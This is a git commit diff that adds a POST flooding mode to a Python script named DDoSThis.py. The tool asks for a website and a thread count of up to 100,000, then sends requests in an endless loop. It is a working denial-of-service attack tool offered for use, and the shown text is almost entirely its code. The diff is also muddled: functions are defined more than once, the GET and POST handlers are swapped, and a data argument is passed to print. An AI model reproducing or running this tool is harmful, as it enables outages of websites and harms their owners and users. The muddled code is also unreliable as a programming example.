bf1661de217c3b927546b1589d09e70e442557b4
BbayuGt <49893593+BbayuGt@users.noreply.github.com>
2020-06-12 17:33:43 +0700

    Added POST Mode

--- DDoSThis.py
+++ DDoSThis.py
@@ -13,7 +13,16 @@ def httpGet(web, tnum):
 			print(f"[!] THREAD-{tnum} Fail to send GET Packet, site down?")
 			time.sleep(3)
 
-
+def httpPost(web, tnum):
+	packNo=1
+	while 1:
+		try:
+			reqs.post(web)
+			print(f"[THREAD-{tnum}]Packet No {packNo} sent to {web} succesfully!", data = {"Created By":"BbayuGt"})
+			packNo += 1
+		except:
+			print(f"[!] THREAD-{tnum} Fail to send GET Packet, site down?")
+			time.sleep(3)
 
 
 def httpGetDialog():
@@ -37,11 +46,80 @@ def httpGetDialog():
 		t.start()
 		print(f"[+] Thread {tnum} deployed.")
 		tnum += 1
+
+def httpGetDialog():
+	web = input("Website : ")
 	
+	if not "http" in web:
+		web = f"http://{web}"
+		
+	thr = input("Thread(s) (default 10) (1-100000) : ")
+	
+	if thr == " " or thr == "":
+		thr = 10
+		
+	if int(thr) <= 0 or int(thr) > 100000:
+		print("too many or less thread!")
+		exit()
+		
+	tnum = 1
+	while tnum <= int(thr):
+		t = thread.Thread(target=httpPost, args=(web, tnum))
+		t.start()
+		print(f"[+] Thread {tnum} deployed.")
+		tnum += 1
+
+
+def httpPostDialog():
+	web = input("Website : ")
+	
+	if not "http" in web:
+		web = f"http://{web}"
+		
+	thr = input("Thread(s) (default 10) (1-100000) : ")
+	
+	if thr == " " or thr == "":
+		thr = 10
+		
+	if int(thr) <= 0 or int(thr) > 100000:
+		print("too many or less thread!")
+		exit()
+		
+	tnum = 1
+	while tnum <= int(thr):
+		t = thread.Thread(target=httpGet, args=(web, tnum))
+		t.start()
+		print(f"[+] Thread {tnum} deployed.")
+		tnum += 1
+
+def httpGetDialog():
+	web = input("Website : ")
+	
+	if not "http" in web:
+		web = f"http://{web}"
+		
+	thr = input("Thread(s) (default 10) (1-100000) : ")
+	
+	if thr == " " or thr == "":
+		thr = 10
+		
+	if int(thr) <= 0 or int(thr) > 100000:
+		print("too many or less thread!")
+		exit()
+		
+	tnum = 1
+	while tnum <= int(thr):
+		t = thread.Thread(target=httpPost, args=(web, tnum))
+		t.start()
+		print(f"[+] Thread {tnum} deployed.")
+		tnum += 1
 	
 class main:
 	print("Select Mode :")
-	print("1. Http GET")
+	print("1. HTTP GET")
+	print("2. HTTP POST")
 	p = input("~> ")
 	if p == "1":
 		httpGetDialog()
+	elif p == "2":
+		httpPostDialog()
